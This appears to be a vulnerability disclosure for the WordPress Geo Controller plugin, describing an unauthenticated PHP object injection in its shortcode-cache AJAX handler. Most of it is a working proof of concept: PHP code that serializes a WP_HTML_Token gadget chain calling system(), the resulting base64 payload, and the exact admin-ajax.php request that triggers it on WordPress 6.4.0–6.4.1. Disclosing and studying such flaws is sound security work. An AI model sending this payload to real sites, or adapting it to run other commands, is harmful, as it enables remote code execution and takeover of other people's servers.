# WordPress Geo Controller Plugin  - PHP Object Injection         

The `cf-geoplugin\inc\classes\Shortcodes.php` file in the Geo Controller Plugin contains a `unserialize` function with a controllable parameter, potentially leading to a PHP object injection vulnerability.

```php
# ajax__shortcode_cache()
unserialize(urldecode(base64_decode(sanitize_text_field(CFGP_U::request_string('options')))));
```

The method is added to `wp_ajax`, leading to an unauthorized PHP Object Injection vulnerability.

```php
$this->add_action('wp_ajax_cf_geoplugin_shortcode_cache', 'ajax__shortcode_cache');
```

It seems like there isn't a proper PHP chain within the plugin itself. However, there might be a possibility of leveraging object injection in WordPress versions 6.4.0 to 6.4.1, potentially leading to remote code execution.

https://www.wordfence.com/blog/2023/12/psa-critical-pop-chain-allowing-remote-code-execution-patched-in-wordpress-6-4-2/

payload：

```php
<?php

class WP_HTML_Token
{
    public $bookmark_name;
    public $on_destroy;

    public function __construct($bookmark_name, $on_destroy)
    {
        $this->bookmark_name = $bookmark_name;
        $this->on_destroy = $on_destroy;
    }
}

echo base64_encode(serialize(new WP_HTML_Token("calc","system")));

# TzoxMzoiV1BfSFRNTF9Ub2tlbiI6Mjp7czoxMzoiYm9va21hcmtfbmFtZSI7czo0OiJjYWxjIjtzOjEwOiJvbl9kZXN0cm95IjtzOjY6InN5c3RlbSI7fQ==
```

构造如下请求：

```
/wp-admin/admin-ajax.php?action=cf_geoplugin_shortcode_cache&options=TzoxMzoiV1BfSFRNTF9Ub2tlbiI6Mjp7czoxMzoiYm9va21hcmtfbmFtZSI7czo0OiJjYWxjIjtzOjEwOiJvbl9kZXN0cm95IjtzOjY6InN5c3RlbSI7fQ==
```

![image-20231214130726758](https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20231214130726758.png)